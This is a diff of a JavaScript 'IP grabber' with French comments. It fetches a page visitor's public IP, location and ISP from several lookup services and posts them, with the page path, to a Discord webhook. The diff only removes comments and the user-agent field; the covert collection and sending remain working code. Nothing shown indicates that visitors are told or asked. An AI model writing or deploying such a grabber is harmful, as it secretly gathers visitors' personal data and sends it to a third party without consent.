@@ -8,7 +8,6 @@
 
   let ip = null, country = '', city = '', region = '', isp = '', source = '';
 
-  // ipapi.co
   try {
     const r = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
     if (r.ok) {
@@ -21,7 +20,6 @@
     }
   } catch (e) { console.warn('[ipapi] échec', e.message); }
 
-  // ipwho.is
   if (!ip) {
     try {
       const r = await fetch('https://ipwho.is/', { cache: 'no-store' });
@@ -36,7 +34,6 @@
     } catch (e) { console.warn('[ipwho] échec', e.message); }
   }
 
-  // ipify
   if (!ip) {
     try {
       const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
@@ -50,19 +47,19 @@
   if (!ip) { ip = 'inconnue'; source = 'aucune'; }
   console.log('[grabber] IP =', ip, '| source =', source);
 
-  // --- Payload SIMPLE (content uniquement, pas d'embed) ---
+  // --- Payload SIMPLE : juste du texte, pas d'embed ---
   const content =
     '🌐 **Visiteur**\n' +
     '📌 IP : `' + ip + '`\n' +
     '📍 Source : ' + source + '\n' +
     '🌍 ' + (country || '—') + ' · ' + (city || '—') + ' · ' + (region || '—') + '\n' +
     '📡 FAI : ' + (isp || '—') + '\n' +
-    '🖥️ UA : `' + (navigator.userAgent || '—').slice(0, 200) + '`\n' +
     '📄 Page : ' + location.pathname;
 
   const payload = { content };
 
-  console.log('[grabber] envoi…');
+  console.log('[grabber] envoi…', payload);
+
   try {
     const r = await fetch(WEBHOOK, {
       method: 'POST',
@@ -74,7 +71,7 @@
       console.log('[grabber] ✅ envoyé');
     } else {
       const txt = await r.text();
-      console.error('[grabber] ❌', r.status, txt);
+      console.error('[grabber] ❌ réponse Discord :', r.status, txt);
     }
   } catch (e) {
     console.error('[grabber] ❌ échec fetch', e.message);
